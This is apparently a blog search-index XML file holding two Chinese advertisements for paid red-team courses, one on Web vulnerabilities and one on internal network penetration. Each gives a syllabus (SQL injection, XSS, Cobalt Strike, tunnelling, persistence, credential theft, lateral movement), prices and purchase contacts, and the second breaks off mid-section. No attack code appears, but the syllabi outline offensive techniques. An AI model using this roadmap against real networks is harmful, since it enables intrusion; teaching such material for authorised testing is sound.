<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Web安全课程培训</title>
      <link href="2023/02/24/web-an-quan-pei-xun/web-an-quan-ke-cheng-pei-xun/"/>
      <url>2023/02/24/web-an-quan-pei-xun/web-an-quan-ke-cheng-pei-xun/</url>
      
        <content type="html"><![CDATA[<h1 id="课程背景和简介"><a href="#课程背景和简介" class="headerlink" title="课程背景和简介"></a>课程背景和简介</h1><p>随着HW和企业攻防演练越来越火，越来越多的安全从业人员选择成为一名红队。红队的薪资待遇也水涨船高。而Web渗透作为红队的必备技能也是重点技能，重要性可想而知。为了给红队和想要打红队以及对红队感兴趣的弟兄们一点点帮助。谢公子联合一线安全从业者为大家准备新鲜有料的Web基础安全课程。</p><h1 id="课程优势"><a href="#课程优势" class="headerlink" title="课程优势"></a>课程优势</h1><p>此课程从0到1，帮助学员建立对web漏洞的整体认知、掌握漏洞黑盒分析的技能、拥有基本的黑盒挖掘漏洞能力。此课程围绕Web攻击中的实战应用，重点突出实战、干货、思路、深度。负责讲解的老师也是一线安全从业者，拥有多年的实战工作经验，让您所学的技术可以在日常工作中真正用得上。 </p><ul><li>讲师A：国内一线红队，信息安全高级工程师，擅长企业安全研究、情报分析、渗透测试，安全开发。</li><li>讲师B：国内一线实验室web安全研究员，擅长渗透测试、安全研究、安全开发。</li><li>讲师C：国内一线红队，资深安全培训讲师，擅长WEB渗透测试、内网渗透。</li></ul><h1 id="课程内容"><a href="#课程内容" class="headerlink" title="课程内容"></a>课程内容</h1><p>课程一共33课时，977.25分钟。</p><table><thead><tr><th>节名称</th><th>节知识点介绍</th><th>时长(单位:min)</th></tr></thead><tbody><tr><td>1.1 概述</td><td>本小节主要讲了以下知识点： 1、服务器介绍 2、中间件介绍 3、数据存储介绍 4、通讯协议介绍</td><td>44.55</td></tr><tr><td>1.2 靶场搭建</td><td>本小节主要讲了以下知识点： 1、docker的使用 2、如何快速搭建靶场</td><td>21.11</td></tr><tr><td>2.1 HTML基础</td><td>本小节主要讲了以下知识点： 1、认识什么是HTML及HTML的结构 2、掌握HTML基本标签（表单、超链接等） 3、掌握HTML中CSS及JS的引入方式</td><td>29</td></tr><tr><td>2.2 Javascript基础</td><td>本小节主要讲了以下知识点： 1. 可以使用简单的JS语法 2. 可以通过F12控制台获取DOM元素 3. 可以使用原生JS进行ajax操作 4. 可以使用jQuery进行ajax操作</td><td>53.54</td></tr><tr><td>2.3 MySQL数据库基础</td><td>本小节主要讲了以下知识点： 1.掌握MySQL数据库的基本增删改查和其他基本语句</td><td>58.5</td></tr><tr><td>2.4 SQL Server数据库基础</td><td>本小节主要讲了以下知识点： 1.掌握SQLServer数据库的基本增删改查和其他基本语句</td><td>38.37</td></tr><tr><td>2.5 PHP基础一</td><td>本小节主要讲了以下知识点： 1.掌握PHP的基本语法及其他PHP基础</td><td>1.0.01</td></tr><tr><td>2.6 PHP基础二</td><td>本小节主要讲了以下知识点： 1.掌握PHP与数据库连接 2.掌握PHP的网络传输基础 3.掌握cookie及session知识</td><td>58.5</td></tr><tr><td>2.7 Java基础一</td><td>本小节主要讲了以下知识点： 1.了解Java的基本发展历程 2.掌握Java的基本知识</td><td>35.11</td></tr><tr><td>2.8 Java基础二</td><td>本小节主要讲了以下知识点： 1.了解Java代码结构 2.了解Java基础类库</td><td>35.11</td></tr><tr><td>2.9 JSP基础</td><td>本小节主要讲了以下知识点： 1.掌握JSP的基础概念 2.掌握JSP的基础语法 3.掌握JSP和JSPX的对应关系</td><td>29.2</td></tr><tr><td>2.10 XML基础</td><td>本小节主要讲了以下知识点： 1.掌握XML基础</td><td>14.05</td></tr><tr><td>3.1 burpsuite基础使用</td><td>本小节主要讲了以下知识点： 1.如何安装配置Burp suite pro 2.常见的功能模块 3.在渗透场景可以帮我们解决的问题 4.如何抓取HTTPS流量 5.各个模块功能介绍</td><td>29.04</td></tr><tr><td>3.2 SQLmap使用</td><td>本小节主要讲了以下知识点： 1.如何安装配置SQLmap 2.什么是SQLmap 3.SQLmap的特性 4.SQLmap使用的方法 5.如何通过SQLmap学习sql注入</td><td>37.28</td></tr><tr><td>3.3 OneForAll使用</td><td>本小节主要讲了以下知识点： 1.什么是OneForAll及解决的问题 2.OneForAll的特性 3.通过OneForAll源码学信息收集 4.对比相关的工具</td><td>39.06</td></tr><tr><td>3.4 Fofa使用</td><td>本小节主要讲了以下知识点： 1.什么是网络空间测绘 2.Fofa的工作原理 3.扩展Fofa的指纹提取 4.如何配合工具做到一个红队快速打点</td><td>34.58</td></tr><tr><td>3.5 Xray的使用</td><td>本小节主要讲了以下知识点： 1.什么是Xray 2.Xray的特性 3.Xray的常规与高级用法 4.与Burp Suite的联动 5.如何通过xray的poc学习</td><td>22.17</td></tr><tr><td>4.1 SQL注入1</td><td>本小节主要讲了以下知识点： 1.sql注入环境搭建</td><td>9.14</td></tr><tr><td>4.2 SQL注入2</td><td>本小节主要讲了以下知识点： 1.sql语句的使用</td><td>17.27</td></tr><tr><td>4.3 SQL注入3</td><td>本小节主要讲了以下知识点： 1.注入原理 2.注入分类 3.数据库特性 4.注入常见流程</td><td>42.3</td></tr><tr><td>5.1 XSS基础一</td><td>本小节主要讲了以下知识点： 掌握XSS的基本概念</td><td>13.38</td></tr><tr><td>5.2 XSS基础二</td><td>本小节主要讲了以下知识点： 掌握XSS的基本绕过方式</td><td>44.23</td></tr><tr><td>5.3 XSS基础三</td><td>本小节主要讲了以下知识点： 掌握XSS平台的搭建及CORS漏洞的利用</td><td>14.09</td></tr><tr><td>6.1 CSRF与SSRF基础</td><td>本小节主要讲了以下知识点： 1.掌握CSRF基本利用及XSS组合利用方式 2.掌握SSRF基本利用方式</td><td>30.4</td></tr><tr><td>7.1 XXE及SOAP基础</td><td>本小节主要讲了以下知识点： 1.掌握XXE基本利用方式 2.SOAP基础</td><td>27.17</td></tr><tr><td>7.2 XPATH</td><td>本小节主要讲了以下知识点： 1.掌握XPATH基本概念 2.掌握XPATH注入的利用</td><td>24.5</td></tr><tr><td>8.1 文件上传和文件包含漏洞</td><td>本小节主要讲了以下知识点： 1.文件上传原理 2.文件上传实践 3.文件包含原理 4.文件实践实践 5.远程、本地文件包含区别</td><td>24.25</td></tr><tr><td>9.1 Java代码执行与命令执行基础</td><td>本小节主要讲了以下知识点： 掌握Java命令执行及代码执行基本利用方式</td><td>19.17</td></tr><tr><td>9.2 PHP代码执行与命令执行基础</td><td>本小节主要讲了以下知识点： 掌握PHP命令执行及代码执行基本利用方式</td><td>23.18</td></tr><tr><td>9.3 反序列化漏洞基础</td><td>本小节主要讲了以下知识点： 掌握Java反序列化常见原理</td><td>6.36</td></tr><tr><td>9.4 第三方组件及框架漏洞基础</td><td>本小节主要讲了以下知识点： 掌握JBOSS、weblogic、fastjson、Shiro、thinkphp基本利用</td><td>47.21</td></tr><tr><td>10.1 未授权访问+敏感信息泄漏</td><td>本小节主要讲了以下知识点： 1.未授权访问原理 2.挖掘思路 3.敏感信息访问原理 4.挖掘思路</td><td>16.11</td></tr><tr><td>11.1 业务逻辑漏洞挖掘</td><td>本小节主要讲了以下知识点： 1.逻辑漏洞挖掘思路 2.案例 （1） 支付功能漏洞挖掘 （2）积分兑换功能漏洞挖掘 （3） 密码找回功能漏洞挖掘 （4） 越权漏洞挖掘 （5） 暴力破解 （6） URL重定向 （7） 界面操作劫持</td><td>39.32</td></tr></tbody></table><p><img src="/2023/02/24/web-an-quan-pei-xun/web-an-quan-ke-cheng-pei-xun/1676687046090-0cc19556-cf89-4be1-b237-19b87ae78265.png" alt="img"></p><h1 id="课程面向对象"><a href="#课程面向对象" class="headerlink" title="课程面向对象"></a>课程面向对象</h1><p>在校网安专业大学生、对网安感兴趣的非网安专业的大学生、初中级红队选手、经验不够丰富，处在入门瓶颈期的红队选手。针对有一些web基础，但是对漏洞没有一个全面体系化认知的人群。</p><h1 id="课程价格"><a href="#课程价格" class="headerlink" title="课程价格"></a>课程价格</h1><p>原价：<font color="#dd0000"><strong><del>1499</del></strong></font>    星球用户优惠价格：<font color="#dd0000"><strong>1299</strong></font></p><p>星球链接：<a href="https://t.zsxq.com/aAim6yZ">https://t.zsxq.com/aAim6yZ</a></p><p><img src="/2023/02/24/web-an-quan-pei-xun/web-an-quan-ke-cheng-pei-xun/1676684971036-aca513cc-0cd4-4cd8-b2bf-1fd1e285166d.png" alt="img"></p><p>如有购买课程意向，私聊谢公子(vx: xie_gongzi520)即可。</p><p><img src="/2023/02/24/web-an-quan-pei-xun/web-an-quan-ke-cheng-pei-xun/1676684971033-74fb46e4-b2ce-48f6-8459-8b857b1a4a75.png" alt="img"></p><h1 id="课程培训方式"><a href="#课程培训方式" class="headerlink" title="课程培训方式"></a>课程培训方式</h1><p>课程已经录制好，对于报名人员直接发放全部加密课程以及课程所配套的学习文档资料，并且有对应的群可以沟通交流学习。</p><ol><li>成体系的课程培训，目前我们已推出的课程是我们认为最优质的安全学习路线，已推出课程：“Web安全进阶” ➜ “Java审计实战” ➜ “工具开发及免杀” ➜ “内网渗透”。</li><li>学员交流空间。</li><li>学习资源分享 。</li><li>课程从0到1，帮助学员建立对web漏洞的整体认知、掌握漏洞黑盒分析的技能、拥有基本的黑盒挖掘漏洞能力。</li></ol><h1 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h1><p>课程均为本地搭建环境，仅为技术交流学习，切不可用于非法用途，违法必究！知识付费，才是高质量知识输出的最佳实践!</p><p><img src="/2023/02/24/web-an-quan-pei-xun/web-an-quan-ke-cheng-pei-xun/1676684972550-d8c78f0b-33de-4723-8295-eee9d98ed032.png" alt="img"></p><p><img src="/2023/02/24/web-an-quan-pei-xun/web-an-quan-ke-cheng-pei-xun/1676684972574-69d91e2e-532d-409f-8c5c-51697992150e.png" alt="img"></p><p><img src="/2023/02/24/web-an-quan-pei-xun/web-an-quan-ke-cheng-pei-xun/1676684972630-586a00e5-d942-431c-8d2e-ac18704e4f6f.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 安全培训 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全培训 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透课程培训</title>
      <link href="2023/02/24/nei-wang-shen-tou-pei-xun/nei-wang-shen-tou-ke-cheng-pei-xun/"/>
      <url>2023/02/24/nei-wang-shen-tou-pei-xun/nei-wang-shen-tou-ke-cheng-pei-xun/</url>
      
        <content type="html"><![CDATA[<h2 id="课程背景和简介"><a href="#课程背景和简介" class="headerlink" title="课程背景和简介"></a>课程背景和简介</h2><p>随着HW和企业攻防演练越来越火，越来越多的安全从业人员选择成为一名红队。红队的薪资待遇也水涨船高。而内网渗透作为红队的必备技能也是重点技能，重要性可想而知。为了给想要学习内网渗透的安全从业人员一个指引方向，谢公子联合国内一线红队选手给大家准备了最贴合实战场景的内网渗透培训课程。</p><h2 id="课程优势"><a href="#课程优势" class="headerlink" title="课程优势"></a>课程优势</h2><p>谢公子重度参与，一线红队，紧贴实战。</p><p><font color="#dd0000">谢公子</font>介绍：《域渗透攻防指南》📚作者，国内知名攻防渗透专家，擅长内网渗透、域渗透、云安全、红队攻防。连续多年参加国家级、省市级、行业级实战攻防演练，并获得优异成绩。荣获安世加2020年度优秀作者奖、2021年国家级攻防演练GAB最佳攻击手。在国内开源社区平台CSDN发表原创性技术文章五百余篇，并获得CSDN博客专家、华为云享专家、漏洞银行大咖认证、“目极千里、洞见安全”沙龙优秀讲师等称号。</p><h2 id="课程内容"><a href="#课程内容" class="headerlink" title="课程内容"></a>课程内容</h2><p>课程从C2专题——&gt;隧道搭建——&gt;权限维持&amp;权限提升——&gt;横向移动。从拿到shell后的全生命周期给大家讲解内网渗透的流程和细节，一定会让大家学到很多新的内网渗透的知识，帮助大家在攻防演练中打出好成绩！并且对于购买课程人员，后续会有免费直播课程进行互动，并且可内推安全大厂。</p><p>课程一共分为四大章，61节课时，1467分钟。</p><table><thead><tr><th>节名称</th><th>节知识点介绍</th><th>时长(单位:min)</th></tr></thead><tbody><tr><td>1.1 MSF安装与升级</td><td>本小节主要讲了MSF安装与升级，知识点如下： 1、如何安装MSF 2、简单的介绍什么是MSF 3、简单的使用方法 4、msfvenom生成shellcode</td><td>19.25</td></tr><tr><td>1.2-1.3 MSF实战攻击(扫描、payload加载、攻击)</td><td>本节主要讲解MSF实战攻击，知识点如下： 1、漏洞利用 2、MSF加载自定义exploit模块 3、攻击载荷（payload）讲解 4、Meterpreter的讲解 5、MS17010的实验 6、回顾</td><td>29.02</td></tr><tr><td>1.4 MSF后渗透阶段1</td><td>本节主要讲解MSF常见后渗透的利用1，知识点如下： 1、Post后渗透模块讲解 2、后渗透的5个方法</td><td>21.48</td></tr><tr><td>1.5 MSF后渗透阶段2</td><td>本节主要讲解MSF常见后渗透的利用2，知识点如下： 1、如何获取用户密码 2、如何运行程序 3、后渗透的19个方法</td><td>32.45</td></tr><tr><td>1.6 CobaltStrike的安装</td><td>本节主要讲解CobaltStrike的安装，知识点如下： 1、简单讲解什么是CS 2、如何安装CS 3、解释CS文件的意义 4、运行CS</td><td>12.56</td></tr><tr><td>1.7 CS创建监听器&amp;本地远程加载插件</td><td>本节主要讲解CS创建监听器&amp;本地远程加载插件，知识点如下： 1、CS创建监听器和监听器内参数的介绍 2、本地和远程加载插件</td><td>13.36</td></tr><tr><td>1.8 CS创建Attacks</td><td>本节主要讲解如何在CS上创建Attacks（生成后门），知识点如下： CS主要的后门类型有哪些及其实验操作的演示</td><td>29.57</td></tr><tr><td>1.9 对被控主机的操作1</td><td>本节主要讲解如何在CS上对被控主机进行操作1，知识点如下： 1、视图View的参数的解释 2、对被控主机的操作1 2.1 抓取hash和dump明文密码 2.2 提权的实操 2.3建立Socks4代理 2.4进程列表（注入进程，键盘监控）</td><td>18.23</td></tr><tr><td>1.10 对被控主机的操作2</td><td>本节主要讲解如何CS上对被控主机进行操作2，知识点如下： 1、生成黄金票据注入当前会话 2、端口扫描 3、哈希传递攻击或SSH远程登录</td><td>14.22</td></tr><tr><td>1.11 MSF和CS联动（C2专题总结）</td><td>本节主要讲解如何MSF和CS的联动，知识点如下： 1、会话的派生 2、CS复制会话到MSF 3、MSF复制会话到CS</td><td>21.24</td></tr><tr><td>2.1 隧道搭建基础</td><td>本小节主要讲了隧道搭建的基础前置知识，知识点如下： 1：几种不同的网站服务器架构设计 2：端口转发和端口映射的区别 3：正向代理和反向代理的区别 4：proxychains和proxifier代理工具的安装和使用</td><td>31.03</td></tr><tr><td>2.2 探测出网协议和端口</td><td>本小节主要讲了如何探测出网协议和出网的端口，知识点如下： 1：在Windows和Linux环境下如何探测出网的端口，以及探测的范围和方式 2：如何探测目标网站不同的出网协议，如ICMP&#x2F;DNS&#x2F;HTTP</td><td>21.21</td></tr><tr><td>2.3 icmp协议出网场景</td><td>本小节主要讲了在只有icmp协议出网场景时的渗透，知识点如下： 1：使用icmpsh进行命令控制 2：使用PingTunnel搭建隧道 3：使用icmp协议上线CobaltStrike</td><td>23.28</td></tr><tr><td>2.4 DNS协议出网场景</td><td>本小节主要讲了在只有DNS协议出网场景时的渗透，知识点如下： 1：CobaltStrike中DNS Beacon的使用 2：使用DNS-Shell进行命令控制 3：利用iodine搭建DNS隧道</td><td>34.34</td></tr><tr><td>2.5 目标不出网场景(http代理&#x2F;上线CS)</td><td>本小节主要讲了当目标不出网场景时的渗透，知识点如下： 1：通过reGeorg搭建http隧道 2：通过Neo-reGeort搭建http隧道 3：通过ABPTTS利用http进行端口转发 4：通过reDuh利用http进行端口转发 5：不出网场景上线CobaltStrike</td><td>28.51</td></tr><tr><td>2.6 目标出网-Frp的使用</td><td>本小节主要讲了当目标出网时如何利用FRP搭建隧道，知识点如下： 1：FRP的介绍、配置文件、参数等讲解 2：利用FRP搭建反向socks5代理 3：利用FRP映射Web服务 4：利用Frp映射RDP服务 5：利用FRP映射SSH服务</td><td>27.22</td></tr><tr><td>2.7 目标出网-NPS的使用</td><td>本小节主要讲了当目标出网时如何利用NPS搭建隧道，知识点如下： 1：NPS的介绍、安装、启动等讲解 2：利用NPS搭建反向socks5代理 3：利用NPS搭建TCP隧道 4：利用NPS搭建UDP隧道 5：利用NPS搭建http正向代理</td><td>26.23</td></tr><tr><td>2.8 目标出网-EW的使用(搭建单级-多级代理)</td><td>本小节主要讲了当目标出网时如何利用EW搭建单级、多级代理，知识点如下： 1：ew的介绍、常用参数等讲解 2：利用ew搭建一级代理 3：利用ew搭建二级代理 4：利用ew搭建三级代理 5：利用ew搭建四级代理</td><td>20.51</td></tr><tr><td>2.9 目标出网-iox的使用</td><td>本小节主要讲了当目标出网时如何利用iox搭建隧道和端口转发，知识点如下： 1：iox的介绍、常用参数等讲解 2：iox fwd转发模式的讲解 3：利用iox搭建正向代理 4：利用iox搭建反向代理</td><td>17.14</td></tr><tr><td>2.10 目标出网-Venom的使用(搭建单级-多级代理)</td><td>本小节主要讲了当目标出网时如何利用Venom搭建单级、多级隧道，知识点如下： 1：Venom的介绍、常用参数、使用等讲解 2：利用Venom搭建一级代理 3：利用Venom搭建二级代理 4：利用Venom搭建三级代理 5：利用Venom搭建四级代理</td><td>29.01</td></tr><tr><td>2.11 MSF和CS搭建代理</td><td>本小节主要讲了当目标出网时如何利用MSF和CobaltStrike搭建隧道，知识点如下： 1：利用MSF搭建socks4A和socks5代理 2：利用MSF进行端口转发 3：利用CobaltStrike搭建Socks4A代理 4：利用CobaltStrike进行端口转发</td><td>14.49</td></tr><tr><td>2.12 端口复用</td><td>本小节主要讲了端口复用，知识点如下： 1：利用python脚本实现端口复用 2：Linux下利用iptables进行端口复用 3：Windows利用WinRM进行端口复用</td><td>30.48</td></tr><tr><td>2.13 隧道搭建小结</td><td>本小节主要总结了隧道搭建这一章的知识点。</td><td>4.46</td></tr><tr><td>3.1 权限维持之进程迁移</td><td>本小节主要讲了进程迁移在权限维持中的应用，主要的知识点如下： 1：进程迁移的概念以及场景 2：CobaltStrike中的进程迁移 3：cs进程注入的profile 4：cs中进程注入的使用 5：bof实现的进程注入</td><td>41.36</td></tr><tr><td>3.2 权限维持修改注册表实现自启动</td><td>本小节主要讲了修改注册表实现自启的相关知识，知识点如下： 1：注册表简介 2：注册表组成 3：五大根键 4：实现原理 5：bof 实现案例</td><td>36.08</td></tr><tr><td>3.3 权限维持注册服务自启</td><td>本小节主要讲了注册服务自启，知识点如下： 1：系统服务介绍系统服务的作用 2：系统服务的作用 3：命令行下创建服务 4：PowerShell创建服务 5：SharPersist 创建服务</td><td>18.2</td></tr><tr><td>3.4 权限维持之计划任务</td><td>本小节主要讲了计划任务自启，知识点如下： 1：计划任务简介 2：schtasks简介 3：schtasks的使用</td><td>26.48</td></tr><tr><td>3.5 权限维持之隐蔽账号和启动目录</td><td>本小节主要讲了隐藏账号以及自启动目录，知识点如下： 1：自启动目录 2：隐藏账号的操作</td><td>16.5</td></tr><tr><td>3.6 权限维持相关CS插件</td><td>本小节主要讲了权限维持相关的cs插件，知识点如下： 1、SharPersist的使用</td><td>17.08</td></tr><tr><td>3.7 权限提升之系统溢出漏洞提权</td><td>本小节主要讲了在windows下如何通过历史漏洞进行权限提升，并以CVE-2018-8120为例进行了演示讲解</td><td>15.1</td></tr><tr><td>3.8 权限提升之bypassUAC提权</td><td>本小节主要讲了bypassUAC提权，知识点如下： 1：基础介绍 2：SharpBypassUAC使用 3：申请uac弹窗钓鱼 4：ElevateKit使用</td><td>24.29</td></tr><tr><td>3.9 权限提升之Windows Service提权</td><td>本小节主要讲了Windows Service提权，知识点如下： 1：原理简介 2：psexec原理简介 3：atexec的原理及使用</td><td>23.03</td></tr><tr><td>3.10 权限提升之利用相关服务提权(烂土豆系列)</td><td>本小节主要讲了烂土豆系列的权限提升，知识点如下： 1：原理讲解 2：历史土豆解析 3：常用操作演示</td><td>27.34</td></tr><tr><td>4.1 Windows基础信息收集1</td><td>本节以收集Windows系统信息为主，同时包括讲解利用工具来进行系统信息收集。 信息收集是贯穿渗透的整个过程，当然不只是体现在内网渗透中，还包括在WEB渗透、代码审计、CTF当中等等。 那么我们现在从内网渗透出发，重点讲解在Windows信息上需要收集什么（那些东西值得我们收集），怎么收集，收集的意义。当然这一切重在分析信息得出结论。</td><td>33.39</td></tr><tr><td>4.2 Windows基础信息收集2</td><td>本节会讲到在Windows环境中收集包括 1、网络和用户信息 2、使用Bloundhund采集信息 3、使用PingCastle采集信息</td><td>30.49</td></tr><tr><td>4.3 Windows凭据收集之系统账号密码</td><td>本节主要讲解在Windows环境中收集其系统账号，包括 1、收集方法 2、什么是Windows账户 2.1 什么是SAM 2.2 什么是UAC</td><td>23.52</td></tr><tr><td>4.4 Windows凭据收集之RDP凭据</td><td>本节主要讲解如何收集RDP凭据，包括 1、查看连接记录的方法 2、查看凭证的工具 3、查询rdp开放情况 4、开启多用户登录的方法 5、清楚RDP的方法 6、hash登录的实验</td><td>25.34</td></tr><tr><td>4.5 Windows凭据收集之浏览器凭据</td><td>本节主要讲解在Windows环境中如何收集常见的浏览器凭据及其他信息，主要获得浏览器的历史记录和存储密码，我们在熟练使用工具的同时也要知道一些常见浏览器存储历史记录和存储密码的文件所在地，便于我们手动操作。包括 1、chrome、Firefox、360、Edge、 2、使用工具进行收集</td><td>13.32</td></tr><tr><td>4.6 Windows凭据收集之数据库凭据</td><td>本节主要讲解Windows环境中如何收集数据库的凭据，包括 1、常见数据库的保存路径及开放端口信息 2、使用工具进行收集 3、收集思路</td><td>18.32</td></tr><tr><td>4.7 Windows凭据收集之Xshell、SecureCRT凭据及其他凭据</td><td>本节主要讲解在Windows环境中收集一些常见的开发工具的凭据包括 xshell、FinalShell、SecureCRT等一些常见工具，讲述常见利用方法和工具的使用</td><td>21.24</td></tr><tr><td>4.8 Linux信息收集</td><td>本节主要讲解Linux系统下的信息收集</td><td>25.33</td></tr><tr><td>4.9 域内基础信息收集</td><td>本小节主要讲了域内的一些基础信息收集，知识点如下： 1：如何查找域名 2：如何查询域内用户 3：如何查询域内主机 4：如何查询域内的组 5：如何查询域管理员 6：其他一些信息查询，如：域密码策略、域信任关系、域内的OU、SPN等等</td><td>25.4</td></tr><tr><td>4.10 CVE-2020-1472NetLogon权限提升漏洞</td><td>本小节主要讲了CVE-2020-1472 Netlogon权限提升漏洞的使用，知识点如下： 1：漏洞的背景、影响版本等介绍 2：impacket检测和利用 3：mimikatz检测和利用 4：利用后如何恢复域控哈希</td><td>23.3</td></tr><tr><td>4.11 Windows Print Spooler权限提升漏洞(PrintNightmare)</td><td>本小节主要讲了CVE-2021-1675 Windows Print Spooler权限提升漏洞的使用，知识点如下： 1：漏洞的背景、影响版本等介绍 2：该漏洞的完整利用 3：漏洞的防护</td><td>30.08</td></tr><tr><td>4.12 ADCS证书服务攻击</td><td>本小节主要讲了ADCS证书服务攻击漏洞的使用，知识点如下： 1：证书服务的基础知识 2：搭建Active Directory证书服务 3：漏洞的原理和利用</td><td>25.44</td></tr><tr><td>4.13 Exchange第一篇(基础介绍、爆破、CVE-2020-0688)</td><td>本小节主要讲了Exchange邮箱服务器的一些基础知识，知识点如下： 1：Exchange邮箱服务器的一些接口 2：Exchange邮箱服务器的账号密码爆破 3：CVE-2020-0688 Exchange Server反序列化漏洞原理和利用</td><td>26.04</td></tr><tr><td>4.14 Exchange第二篇(ProxyLogon攻击链、Dcsync)</td><td>本小节主要讲了Exchange邮箱服务器ProxyLogon攻击链和DCsync知识，知识点如下： 1：CVE-2021-26858&#x2F;CVE-2021-27065ProxyLogon任意文件写入漏洞 2：Exchange Server writeACL Dcsync导出域哈希</td><td>27.57</td></tr><tr><td>4.15 内网主机存活探测</td><td>本小节主要讲了内网主机存活探测，知识点如下： 1：存活探测相关协议 2：存活ip探测方式 3：存活扫描策略</td><td>31.1</td></tr><tr><td>4.16 内网主机端口扫描</td><td>本小节主要讲了内网主机端口扫描，知识点如下： 1：全量扫描 2：细化扫描 3：一些工具</td><td>32</td></tr><tr><td>4.17 内网主机netbio扫描&amp;多网卡主机扫描</td><td>本小节主要讲了内网主机netbios扫描&amp;多网卡主机扫描，知识点如下： 1：netbios扫描 2：netbios扫描的目的 3：netbios扫描的工具 4：OXID定位多网卡主机 5：OXID扫描的目的 6：OXID扫描的工具</td><td>22.38</td></tr><tr><td>4.18 内网web探测</td><td>本小节主要讲了内网web探测，知识点如下： 1：web端口top200 2：web探测的策略 3：一些成熟工具的使用</td><td>25.33</td></tr><tr><td>4.19 MS17010扫描探测利用(不同工具、不同系统版本的利用)</td><td>本小节主要讲了MS17010扫描探测利用，知识点如下： 1：扫描探测ms17010漏洞 2：ms17010较为通用的打发 3：zzz_exploit项目的使用</td><td>23.23</td></tr><tr><td>4.20 MySQL UDF提权</td><td>本小节主要讲了MySQL UDF提权，知识点如下： 1：mysql udf 简介 2：内网中mysql密码喷洒 3：windows下udf提权的条件 4：mysql_udf_exec</td><td>14</td></tr><tr><td>4.21 SQLServer 提权(xp_cmdshell、clr)</td><td>本小节主要讲了SQLServer 提权，知识点如下： 1：mssql 密码喷洒 2：xp_cmdshell 3：SQL Server CLR 4：SharpSQLTools</td><td>20.24</td></tr><tr><td>4.22 Redis exec执行系统命令</td><td>本小节主要讲了Redis exec执行系统命令，知识点如下： 1：redis简介 2：redis未授权扫描 3：写ssh-keygen公钥 4：反弹shell的操作</td><td>19.3</td></tr><tr><td>4.23 SSH &amp; RDP爆破及利用</td><td>本小节主要讲了SSH &amp; RDP爆破及利用，包括一些保质量字典的推荐，以及几款常用工具的演示</td><td>29.24</td></tr><tr><td>4.24 横向权限扩展一(135端口)</td><td>本小节主要讲了如何通过135端口进行横向移动，知识点如下： 1：LocalAccountTokenFilterPolicy注册表值的介绍 2：利用SharpWmi通过135端口进行横向移动 3：利用WmiHacker通过135端口进行横向移动</td><td>30.36</td></tr><tr><td>4.25 横向权限扩展二(135和445端口)</td><td>本小节主要讲了如何通过135和445端口进行横向移动，知识点如下： 1：利用impacket下的wmiexec.py脚本通135和445端口进行横向移动 2：利用wmiexec.vbs脚本通135和445端口进行横向移动 3：Wmiexec横向过程的日志分析</td><td>14.52</td></tr><tr><td>4.26 横向权限扩展三(445端口)</td><td>本小节主要讲了如何通过445端口进行横向移动，知识点如下： 1：IPC$共享的介绍和利用 2：利用impacket下的psexec.py脚本通过445端口进行横向移动，并且进行日志分析 3：利用impacket下的smbexec.py脚本通过445端口进行横向移动，并且进行日志分析</td><td>44.45</td></tr><tr><td>4.27 横向权限扩展四(5985端口)</td><td>本小节主要讲了如何通过5985端口进行横向移动，知识点如下： 1：WinRM的介绍和配置 2：利用WinRM远程连接主机</td><td>20.15</td></tr><tr><td>4.28 内网中Web漏洞的利用</td><td>本小节主要讲了内网中Web漏洞的利用，知识点如下： 1：web漏洞库 2：漏洞靶场 3：内网常用web漏洞 4：web漏洞扫描</td><td>27.01</td></tr></tbody></table><p><img src="/2023/02/24/nei-wang-shen-tou-pei-xun/nei-wang-shen-tou-ke-cheng-pei-xun/1675478352233-16b6d31c-9537-4f0e-b47b-df1b15fa87c7.png" alt="img"></p><p><img src="/2023/02/24/nei-wang-shen-tou-pei-xun/nei-wang-shen-tou-ke-cheng-pei-xun/1675478362135-984e862a-d3fc-4290-8bb3-2dc04b2a116b.png" alt="img"></p><h2 id="课程面向对象"><a href="#课程面向对象" class="headerlink" title="课程面向对象"></a>课程面向对象</h2><p>在校网安专业大学生、对网安感兴趣的非网安专业的大学生、初中级红队选手、经验不够丰富，处在入门瓶颈期的红队选手，对内网渗透感兴趣有过实战经验的朋友均可。</p><h2 id="课程价格"><a href="#课程价格" class="headerlink" title="课程价格"></a>课程价格</h2><p>原价：<font color="#dd0000"><strong><del>4999</del></strong></font>    星球用户优惠价格：<font color="#dd0000"><strong>1999</strong></font></p><p>星球链接：<a href="https://t.zsxq.com/aAim6yZ">https://t.zsxq.com/aAim6yZ</a></p><p><img src="/2023/02/24/nei-wang-shen-tou-pei-xun/nei-wang-shen-tou-ke-cheng-pei-xun/1675478768283-912ca6f9-d27b-401c-b9fa-a57a1510a770.png" alt="img"></p><p>如有购买课程意向，私聊谢公子(vx: xie_gongzi520)即可。</p><p><img src="/2023/02/24/nei-wang-shen-tou-pei-xun/nei-wang-shen-tou-ke-cheng-pei-xun/1675478874448-1486e7a5-f4af-4603-9241-6e9db962e61c.png" alt="img"></p><h2 id="课程培训方式"><a href="#课程培训方式" class="headerlink" title="课程培训方式"></a>课程培训方式</h2><p>​    课程已经录制好，对于报名人员直接发放全部加密课程以及课程所配套的学习文档资料，并且有对应的群可以沟通交流学习。</p><p><img src="/2023/02/24/nei-wang-shen-tou-pei-xun/nei-wang-shen-tou-ke-cheng-pei-xun/1675478929375-37334be5-0d61-4ea0-bd87-d52023c9b96d.png" alt="img"></p><p><img src="/2023/02/24/nei-wang-shen-tou-pei-xun/nei-wang-shen-tou-ke-cheng-pei-xun/1675478934693-66511f46-b608-48ce-8271-4e5c00ac6514.png" alt="img"></p><p><img src="/2023/02/24/nei-wang-shen-tou-pei-xun/nei-wang-shen-tou-ke-cheng-pei-xun/1675478940522-d0c110c8-cd2f-43bb-bb1d-da04de0a8e60.png" alt="img"></p><p><img src="/2023/02/24/nei-wang-shen-tou-pei-xun/nei-wang-shen-tou-ke-cheng-pei-xun/1675478946133-82ce06d5-a20a-493f-891d-088164875b5b.png" alt="img"></p><h2 id="课程试看"><a href="#课程试看" class="headerlink" title="课程试看"></a>课程试看</h2><p>​    为了便于大家对课程内容和课程质量进行了解，提供了试看课程。</p><p>​    也可点击链接进行试看：<a href="https://xan.h5.xeknow.com/s/QeyCr">https://xan.h5.xeknow.com/s/QeyCr</a></p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>​    